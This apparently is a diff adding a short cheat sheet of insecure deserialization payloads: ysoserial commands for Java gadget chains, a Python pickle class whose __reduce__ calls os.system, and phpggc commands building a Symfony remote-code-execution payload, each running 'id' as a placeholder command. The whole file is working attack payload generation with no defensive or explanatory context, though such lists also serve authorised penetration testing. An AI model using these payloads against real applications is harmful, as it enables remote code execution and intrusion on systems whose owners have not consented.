@@ -1,0 +1,18 @@
+# Deserialization Payloads
+
+## Java (ysoserial)
+java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser
+java -jar ysoserial.jar Groovy1 "id" > payload.ser
+java -jar ysoserial.jar JDK7u21 "id" > payload.ser
+
+## Python (pickle)
+import pickle
+import os
+class Payload:
+    def __reduce__(self):
+        return (os.system, ('id',))
+pickle.dumps(Payload())
+
+## PHP (phpggc)
+phpggc -l
+phpggc -o payload.php Symfony/RCE4 "id"
